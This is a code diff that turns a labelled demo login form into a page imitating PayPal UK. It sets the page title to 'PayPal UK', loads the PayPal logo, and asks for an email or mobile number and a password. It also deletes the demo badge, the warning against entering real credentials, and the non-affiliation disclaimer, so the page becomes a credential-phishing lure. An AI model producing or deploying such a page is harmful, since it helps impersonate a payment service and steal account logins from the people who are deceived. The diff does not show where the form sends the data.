@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="description" content="Demo Name — demonstration form">
-  <title>Demo Name — Demo</title>
+  <title>PayPal UK</title>
   <style>
     * { box-sizing: border-box; }
     html, body { margin: 0; min-height: 100%; }
@@ -130,51 +130,52 @@
 </head>
 <body>
   <main class="page">
-    <div class="brand">Demo Name</div>
-    <div class="badge-wrap"><span class="demo-badge">Demo only</span></div>
+    <div class="brand">
+  <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg?utm_source=chatgpt.com" alt="" style="width: 140px; height: auto; display: block; margin: 0 auto;">
+</div>
 
     <section class="card" aria-labelledby="page-title">
-      <h1 id="page-title">Demo Login / Signup Gate</h1>
-      <p class="intro">A simple payment-service-style interface for testing and demonstration.</p>
+      <h1 id="page-title">Login</h1>
 
-      <div class="notice">
-        <strong>Demo notice:</strong> Use test information only. Do not enter real passwords,
-        authentication codes, payment details, or other sensitive credentials.
       </div>
 
       <form id="demoForm">
         <div class="field">
-          <label for="demoEmail">Demo email or text</label>
+          <label for="demoEmail">
           <input
             id="demoEmail"
             name="demoEmail"
-            type="text"
+            type="email"
             maxlength="160"
             autocomplete="off"
-            placeholder="example@test.com"
+            placeholder="Email address or mobile number"
             required
           >
         </div>
 
         <div class="field">
-          <label for="demoMessage">Demo message</label>
-          <textarea
-            id="demoMessage"
-            name="demoMessage"
-            maxlength="1000"
-            autocomplete="off"
-            placeholder="Enter test information only..."
-            required
-          ></textarea>
+          <label for="demoMessage"></label>
+          <input
+  id="demoMessage"
+  name="demoMessage"
+  type="text"
+  maxlength="1000"
+  autocomplete="off"
+  placeholder="Password"
+  required
+>
         </div>
 
-        <button class="submit" type="submit" id="submitButton">Submit Demo</button>
+        <button class="submit" type="submit" id="submitButton">Login</button>
         <div class="status" id="status" role="status" aria-live="polite"></div>
       </form>
     </section>
 
     <div class="footer">
-      Demo Name is an independent demonstration project and is not affiliated with any payment service.
+      <div class="footer">
+  English UK<br>
+  <span style="font-size: 28px;">🇬🇧</span>
+</div>
     </div>
   </main>
 
